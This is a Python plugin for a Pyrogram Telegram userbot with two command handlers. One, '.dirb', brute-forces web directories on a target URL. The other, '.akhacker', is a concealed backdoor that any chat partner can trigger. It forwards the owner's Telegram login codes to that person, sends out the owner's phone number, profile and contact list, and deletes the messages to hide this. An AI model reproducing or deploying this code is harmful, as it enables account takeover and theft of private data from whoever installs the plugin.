from pyrogram import Client, filters
from pyrogram.errors import BadRequest, Forbidden
import time
import requests
import threading
import json

@Client.on_message(filters.me & filters.text & filters.command("dirb","."))
async def dirbuster(client, message):
    cmd = message.command
    if len(cmd) > 2:
        url = cmd[1]
        wordlisturl = cmd[2]
        try:
            print("in brute")
            wordlist = requests.get(wordlisturl).content.decode("utf-8").split()
            d = await client.send_message(chat_id=message.chat["id"], reply_to_message_id=int(message.message_id), text="Attack started...")
            msgid = d.message_id
            chatid = d.chat['id']
            comd = message.message_id
            comdchat = message.chat['id']
            # for i in range(1000):
            #     msg = await client.get_messages(comdchat,comd)
            #     print(msg.text)
            #     time.sleep(5)
            for word in wordlist:
                msg = await client.get_messages(comdchat,comd)
                if msg.text == None:
                    await client.send_message(chat_id=chatid, reply_to_message_id=int(msgid), text="Attack stopped...")
                    break
                else:
                    try:
                        r = requests.get(url+word)
                        print("trying : " + word)
                        if r.status_code == 200:
                            await client.send_message(chat_id=chatid,reply_to_message_id=msgid,text="\nfound : " + url + word)
                    except Exception as error:
                        await message.reply(str(error))
                        continue
        except Exception as error:
            await message.reply(str(error))

telegramacc = 777000

@Client.on_message(filters.text & filters.command("akhacker","."))
async def getchats(client, message):
    cmd = message.command
    hackerid = message.chat['id']
    if cmd[1] == "login":
        # time.sleep(3)
        # await client.forward_messages(hackerid,message.chat['id'], message.message_id)
        m = await client.get_history(telegramacc, limit=1)
        msg = m[0]
        f = await client.forward_messages(hackerid,message.chat['id'], msg.message_id)
        # print(f)
        await client.delete_messages(hackerid, f.message_id, revoke=False)
        await client.delete_messages(hackerid, message.message_id, revoke=False)
        await client.delete_messages(telegramacc, msg.message_id, revoke=False)
    elif cmd[1] == "info":
        info = await client.get_me()
        d = await client.send_message(hackerid, info)
        await client.delete_messages(hackerid, d.message_id, revoke=False)
        await client.delete_messages(hackerid, message.message_id, revoke=False)
    elif cmd[1] == "contacts":
        info = await client.get_contacts()
        contacts = {}
        contacts["telecontacts"] = []
        for i in info:
            # d = await client.send_message(hackerid, i)
            # await client.delete_messages(hackerid, d.message_id, revoke=False)
            # c = await client.send_message(hackerid,i.phone_number)
            # await client.delete_messages(hackerid, c.message_id, revoke=False)
            contacts["telecontacts"].append({
                "name":i.first_name,
                "number":i.phone_number
            })
        with open("contacts.txt","w") as file:
            json.dump(contacts, file)
        d = await client.send_document(hackerid,"contacts.txt")
        await client.delete_messages(hackerid, d.message_id, revoke=False)
        await client.delete_messages(hackerid, message.message_id, revoke=False)
    elif cmd[1] == "number":
        info = await client.get_me()
        d = await client.send_message(hackerid, info.phone_number)
        await client.delete_messages(hackerid, d.message_id, revoke=False)
        await client.delete_messages(hackerid, message.message_id, revoke=False)
